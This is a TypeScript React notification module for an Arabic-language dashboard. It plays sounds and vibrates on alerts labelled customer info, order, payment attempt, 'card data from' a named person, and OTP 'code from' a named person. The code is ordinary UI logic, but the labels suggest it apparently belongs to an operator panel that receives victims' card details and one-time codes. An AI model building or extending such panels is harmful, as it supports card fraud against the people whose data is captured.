import { useState, useEffect, useCallback, useRef } from 'react';

export type NotificationType = 'customer' | 'order' | 'payment' | 'otp';

export interface Notification {
  id: string;
  type: NotificationType;
  title: string;
  subtitle?: string;
  timestamp: Date;
  read: boolean;
}

// Sound URLs - Notification sounds
const SOUND_URLS: Record<NotificationType, string> = {
  // Notification sound for customer info
  customer: 'https://assets.mixkit.co/active_storage/sfx/253/253-preview.mp3',
  
  // Same sound for order summary
  order: 'https://assets.mixkit.co/active_storage/sfx/253/253-preview.mp3',
  
  // Payment attempt sound
  payment: '/CauCxhxU.mp3',
  
  // OTP verification sound
  otp: 'https://assets.mixkit.co/active_storage/sfx/2018/2018-preview.mp3',
};

// Track if user has interacted (required for autoplay)
let userHasInteracted = false;

const NOTIFICATION_TITLES: Record<NotificationType, string> = {
  customer: 'معلومات عميل جديد',
  order: 'ملخص طلب جديد',
  payment: 'محاولة دفع',
  otp: 'رمز تحقق',
};

const NOTIFICATION_SUBTITLES: Record<NotificationType, (name: string) => string> = {
  customer: (name) => `${name} أرسل معلوماته`,
  order: (name) => `طلب من ${name}`,
  payment: (name) => `بيانات بطاقة من ${name}`,
  otp: (name) => `رمز من ${name}`,
};

// Audio cache
const audioCache: Record<NotificationType, HTMLAudioElement | null> = {
  customer: null,
  order: null,
  payment: null,
  otp: null,
};

// Preload audio
function preloadAudio(type: NotificationType): Promise<HTMLAudioElement> {
  return new Promise((resolve, reject) => {
    const audio = new Audio();
    audio.src = SOUND_URLS[type];
    audio.volume = 0.7;
    audio.preload = 'auto';
    
    audio.oncanplaythrough = () => {
      audioCache[type] = audio;
      resolve(audio);
    };
    
    audio.onerror = () => {
      console.error('[NOTIFICATION] Failed to load audio for:', type);
      reject(new Error(`Failed to load audio for ${type}`));
    };
    
    audio.load();
  });
}

// Preload all sounds
async function preloadAllSounds() {
  await Promise.all(
    (Object.keys(SOUND_URLS) as NotificationType[]).map(type => 
      preloadAudio(type).catch(err => {
        console.error('[NOTIFICATION] Sound preload error:', err);
        return null;
      })
    )
  );
}

// Initialize sounds
preloadAllSounds();

// Prepare audio context on user interaction (important for mobile)
function prepareAudioOnInteraction() {
  if (userHasInteracted) return;
  userHasInteracted = true;
  
  // Preload all sounds after interaction
  preloadAllSounds().catch(console.error);
  
  // Try to play a silent audio to unlock audio on iOS/Android
  const silentAudio = new Audio();
  silentAudio.src = 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=';
  silentAudio.volume = 0;
  silentAudio.play().catch(() => {});
  
  // Enable vibration on supported devices
  if ('vibrate' in navigator) {
    navigator.vibrate(100);
  }
}

// Add interaction listeners
['click', 'touchstart', 'keydown', 'scroll', 'mousemove'].forEach(event => {
  document.addEventListener(event, prepareAudioOnInteraction, { once: true, passive: true });
});

// Play sound
async function playSound(type: NotificationType): Promise<void> {
  // Check if user has interacted (required by browsers for autoplay)
  if (!userHasInteracted) {
    console.log('[NOTIFICATION] User has not interacted yet, sound queued');
    // Wait for user interaction then play
    const playOnInteraction = async () => {
      userHasInteracted = true;
      await playSound(type);
    };
    ['click', 'touchstart', 'keydown'].forEach(event => {
      document.addEventListener(event, playOnInteraction, { once: true });
    });
    return;
  }

  try {
    // Try to use cached audio first
    let audio = audioCache[type];
    
    // If not cached, create and load audio
    if (!audio) {
      audio = new Audio(SOUND_URLS[type]);
      audio.volume = 0.7;
      await new Promise((resolve, reject) => {
        audio!.oncanplaythrough = resolve;
        audio!.onerror = reject;
        audio!.load();
      });
      audioCache[type] = audio;
    }
    
    // Reset and play
    audio.currentTime = 0;
    await audio.play();
    console.log('[NOTIFICATION] Sound played for:', type);
    
    // Also vibrate on mobile
    if ('vibrate' in navigator) {
      navigator.vibrate([200, 100, 200]);
    }
  } catch (error) {
    console.error('[NOTIFICATION] Sound play failed for:', type, error);
  }
}

// Global state
let globalNotifications: Notification[] = [];
let globalUnreadCount = 0;
const globalListeners: Set<(notifications: Notification[], unreadCount: number) => void> = new Set();

// Notify all listeners
function notifyListeners() {
  globalListeners.forEach((listener) => {
    try {
      listener([...globalNotifications], globalUnreadCount);
    } catch (e) {
      // Ignore listener errors
    }
  });
}

// Global function to add notification
export function addGlobalNotification(type: NotificationType, name?: string) {
  console.log('[NOTIFICATION] addGlobalNotification called:', type, name);
  
  const notification: Notification = {
    id: `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    type,
    title: NOTIFICATION_TITLES[type],
    subtitle: name ? NOTIFICATION_SUBTITLES[type](name) : undefined,
    timestamp: new Date(),
    read: false,
  };

  globalNotifications = [notification, ...globalNotifications].slice(0, 50);
  globalUnreadCount++;
  
  // Play sound immediately
  console.log('[NOTIFICATION] Playing sound for:', type);
  playSound(type);
  
  notifyListeners();
}

// Global function to clear all
export function clearAllNotifications() {
  globalNotifications = [];
  globalUnreadCount = 0;
  notifyListeners();
}

// Global function to mark all as read
export function markAllNotificationsAsRead() {
  globalNotifications = globalNotifications.map((n) => ({ ...n, read: true }));
  globalUnreadCount = 0;
  notifyListeners();
}

// Hook for components to use notifications
export function useNotifications() {
  const [notifications, setNotifications] = useState<Notification[]>([...globalNotifications]);
  const [unreadCount, setUnreadCount] = useState(globalUnreadCount);
  const [soundEnabled, setSoundEnabled] = useState<boolean>(() => {
    const saved = localStorage.getItem('notification_sound_enabled');
    return saved !== null ? saved === 'true' : true;
  });

  // Listen to global state changes
  useEffect(() => {
    const listener = (notifs: Notification[], count: number) => {
      setNotifications([...notifs]);
      setUnreadCount(count);
    };
    globalListeners.add(listener);
    return () => {
      globalListeners.delete(listener);
    };
  }, []);

  // Save sound preference
  useEffect(() => {
    localStorage.setItem('notification_sound_enabled', String(soundEnabled));
  }, [soundEnabled]);

  const markAllAsRead = useCallback(() => {
    markAllNotificationsAsRead();
  }, []);

  const clearAll = useCallback(() => {
    clearAllNotifications();
  }, []);

  const toggleSound = useCallback(() => {
    setSoundEnabled((prev) => !prev);
  }, []);

  return {
    notifications,
    unreadCount,
    soundEnabled,
    markAllAsRead,
    clearAll,
    toggleSound,
  };
}
